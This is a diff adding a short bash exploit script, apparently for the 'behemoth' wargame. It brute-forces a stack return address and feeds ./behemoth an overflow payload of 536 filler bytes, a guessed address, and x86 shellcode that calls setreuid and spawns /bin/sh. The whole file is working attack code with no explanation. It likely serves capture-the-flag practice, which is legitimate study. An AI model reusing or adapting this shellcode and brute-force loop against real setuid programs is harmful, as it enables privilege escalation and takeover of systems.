@@ -1,0 +1,17 @@
+#!/bin/bash
+
+function main()
+{
+    start=0xffffd800 # set to 0xffff0000
+    for i in $(seq 1 65535); do
+        # iaddress="\xd0\xd3\xff\xff"
+        address=`printf "%x" $(($start + i)) | tac -rs .. | sed -e 's/../\\\\x\0/g'`
+
+        payload=`python -c "print 'A'*536 + '$address' + '\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'"`
+
+        echo "payload address: " $address
+        ./behemoth $payload
+    done
+}
+
+main
